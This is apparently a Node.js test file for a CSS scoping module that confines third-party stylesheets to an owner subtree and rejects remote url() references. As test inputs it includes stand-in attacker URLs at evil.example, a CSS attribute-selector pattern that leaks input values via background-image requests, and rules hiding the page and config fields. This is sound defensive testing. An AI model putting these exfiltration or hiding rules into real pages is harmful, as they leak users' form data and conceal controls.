/**
 * `src/style-scoper.js` — containment and egress, pinned by example.
 *
 * See `.plans/30-scoped-stylesheets.md` and the module comment for why `url()` is the rule
 * (not a property denylist) and why `position: fixed` is rejected rather than contained.
 */
const test = require('node:test');
const assert = require('node:assert');

const { scopeStylesheet, topLevelSelectors } = require('../src/style-scoper.js');

function scoped(css) {
  const result = scopeStylesheet(css, 'owner-1');
  assert.strictEqual(result.ok, true, 'expected ok, got errors: ' + JSON.stringify(result.errors));
  return result.css;
}

function rejected(css) {
  const result = scopeStylesheet(css, 'owner-1');
  assert.strictEqual(result.ok, false, 'expected rejection, got: ' + result.css);
  return result.errors;
}

test('a bare selector gets the owner prefix prepended', () => {
  const css = scoped('.foo { color: red; }');
  assert.match(css, /\[data-style-owner="owner-1"\] \.foo/);
});

test('a comma-separated selector list is prefixed member by member', () => {
  const css = scoped('.a, .b { color: red; }');
  assert.match(css, /\[data-style-owner="owner-1"\] \.a,\s*\[data-style-owner="owner-1"\] \.b/);
});

test('a functional pseudo-class with a comma inside does not split into two selectors', () => {
  const css = scoped(':not(.a, .b) { color: red; }');
  const matches = css.match(/\[data-style-owner="owner-1"\]/g) || [];
  assert.strictEqual(matches.length, 1, 'expected one prefix, :not(a, b) split into two selectors');
});

test('@media recurses into its contents and keeps the condition', () => {
  const css = scoped('@media (min-width: 400px) { .foo { color: red; } }');
  assert.match(css, /@media \(min-width: 400px\)/);
  assert.match(css, /\[data-style-owner="owner-1"\] \.foo/);
});

test('@supports recurses the same way', () => {
  const css = scoped('@supports (display: grid) { .foo { display: grid; } }');
  assert.match(css, /@supports \(display: grid\)/);
  assert.match(css, /\[data-style-owner="owner-1"\] \.foo/);
});

test(':root is rewritten to the owner prefix, not left global', () => {
  const css = scoped(':root { --x: 1px; }');
  assert.doesNotMatch(css, /:root/);
  assert.match(css, /\[data-style-owner="owner-1"\] \{/);
});

test('@keyframes is namespaced by owner id, and its own percentage selectors are untouched', () => {
  const css = scoped('@keyframes pulse { 0% { opacity: 0; } 100% { opacity: 1; } }');
  assert.match(css, /@keyframes pulse--owner-1/);
  assert.doesNotMatch(css, /\[data-style-owner="owner-1"\] 0%/, 'a keyframe percentage is not a selector');
});

test('an animation-name reference is rewritten to match its renamed @keyframes', () => {
  const css = scoped([
    '@keyframes pulse { 0% { opacity: 0; } }',
    '.foo { animation-name: pulse; }',
  ].join('\n'));
  assert.match(css, /animation-name:\s*pulse--owner-1/);
});

test('the animation shorthand is rewritten the same way', () => {
  const css = scoped([
    '@keyframes pulse { 0% { opacity: 0; } }',
    '.foo { animation: pulse 1s ease-in-out; }',
  ].join('\n'));
  assert.match(css, /animation:\s*pulse--owner-1 1s ease-in-out/);
});

test('two scripts do not collide on the same @keyframes name', () => {
  const a = scopeStylesheet('@keyframes pulse { 0% { opacity: 0; } }', 'owner-a').css;
  const b = scopeStylesheet('@keyframes pulse { 0% { opacity: 0; } }', 'owner-b').css;
  assert.match(a, /pulse--owner-a/);
  assert.match(b, /pulse--owner-b/);
  assert.notStrictEqual(a, b);
});

test('a stylesheet-level @import is stripped silently, not rejected', () => {
  const result = scopeStylesheet('@import url("fonts.css"); .foo { color: red; }', 'owner-1');
  assert.strictEqual(result.ok, true);
  assert.doesNotMatch(result.css, /@import/);
  assert.match(result.css, /\.foo/);
});

test('@font-face has no selector to scope, but is kept', () => {
  const css = scoped('@font-face { font-family: "X"; src: url(data:font/woff2;base64,AAAA); }');
  assert.match(css, /@font-face/);
});

const URL_PROPERTIES = [
  'background-image: url(https://evil.example/a)',
  'cursor: url(https://evil.example/a)',
  'list-style-image: url(https://evil.example/a)',
  'border-image: url(https://evil.example/a)',
  'mask-image: url(https://evil.example/a)',
  'content: url(https://evil.example/a)',
  'filter: url(https://evil.example/a#f)',
];

URL_PROPERTIES.forEach((decl) => {
  test('a non-data: url() is rejected in "' + decl.split(':')[0] + '"', () => {
    const errors = rejected('.foo { ' + decl + '; }');
    assert.ok(errors.some((e) => /url\(\)/.test(e)));
  });
});

test('image-set() with a plain URL is rejected', () => {
  rejected('.foo { background-image: image-set(url(https://evil.example/a) 1x); }');
});

test('@font-face with a remote src is rejected, not silently stripped', () => {
  const errors = rejected('@font-face { font-family: "X"; src: url(https://evil.example/font.woff2); }');
  assert.ok(errors.length > 0);
});

test('a data: url() is allowed', () => {
  const css = scoped('.foo { background-image: url(data:image/png;base64,AAAA); }');
  assert.match(css, /background-image: url\(data:image\/png;base64,AAAA\)/);
});

test('the exfiltration shape is rejected outright, not stripped to something inert', () => {
  const errors = rejected('input[value^="x"] { background-image: url(https://evil.example/x); }');
  assert.ok(errors.length > 0, 'expected a rejection, not silence');
});

test('a hostile stylesheet reaching for global selectors is scoped, not blocked', () => {
  // Scoping is the containment — `*`, `body` and an app class all still parse, they just cannot
  // reach outside the owner's own subtree once scoped.
  const css = scoped([
    '* { display: none; }',
    'body { background: black; }',
    '.config-ui-field { display: none; }',
  ].join('\n'));
  assert.match(css, /\[data-style-owner="owner-1"\] \*/);
  assert.match(css, /\[data-style-owner="owner-1"\] body/);
  assert.match(css, /\[data-style-owner="owner-1"\] \.config-ui-field/);
  assert.doesNotMatch(css, /^\* \{/m);
});

test('position: fixed is rejected', () => {
  const errors = rejected('.foo { position: fixed; top: 0; left: 0; }');
  assert.ok(errors.some((e) => /position: fixed/.test(e)));
});

test('an unterminated block is a build error, not a silent drop', () => {
  const errors = rejected('.foo { color: red;');
  assert.ok(errors.length > 0);
});

test('an unsupported at-rule is a build error', () => {
  const errors = rejected('@layer base { .foo { color: red; } }');
  assert.ok(errors.length > 0);
});

test('an empty ownerId is refused', () => {
  const result = scopeStylesheet('.foo { color: red; }', '');
  assert.strictEqual(result.ok, false);
});

test('topLevelSelectors lists raw selectors, recursing into @media and skipping @keyframes', () => {
  const selectors = topLevelSelectors([
    '.a { color: red; }',
    '@media (min-width: 400px) { .b, .c { color: blue; } }',
    '@keyframes pulse { 0% { opacity: 0; } }',
  ].join('\n'));
  assert.deepStrictEqual(selectors, ['.a', '.b', '.c']);
});

test('topLevelSelectors returns nothing for an unparseable stylesheet', () => {
  assert.deepStrictEqual(topLevelSelectors('.a { color: red;'), []);
});
